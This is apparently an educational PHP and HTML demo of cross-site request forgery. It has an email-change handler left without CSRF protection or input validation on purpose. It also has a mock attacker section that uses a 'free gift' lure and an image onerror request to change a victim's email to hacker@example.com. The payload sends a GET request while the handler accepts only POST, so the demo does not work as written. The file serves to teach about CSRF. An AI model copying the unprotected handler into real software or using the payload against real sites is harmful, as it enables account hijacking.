<?php
session_start();

// Simulated database connection (for demonstration only)
$users = [
    1 => ['email' => 'user@example.com'], // Example user
];

// Simulate user login (in real cases, authentication should be implemented)
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = 1; // Assume the user is logged in with ID 1
}

// Vulnerable Email Change Script (change_email.php)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $new_email = $_POST['email'];
    $user_id = $_SESSION['user_id'];
    
    // Vulnerability: No CSRF protection, no input validation
    $users[$user_id]['email'] = $new_email;
    echo "Email updated to: " . htmlspecialchars($new_email);
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Vulnerability Demo</title>
</head>
<body>
    <h2>Legitimate Email Change Form</h2>
    <form action="" method="POST"> <!-- Vulnerable: No CSRF Token -->
        <label for="email">New Email:</label>
        <input type="email" name="email" required>
        <button type="submit">Change Email</button>
    </form>
    
    <hr>
    
    <h2>Attacker's Malicious Page</h2>
    <p>Click below to receive a free gift!</p>
    <img src="#" onerror="this.src='http://localhost/change_email.php?email=hacker@example.com'">
    
</body>
</html>
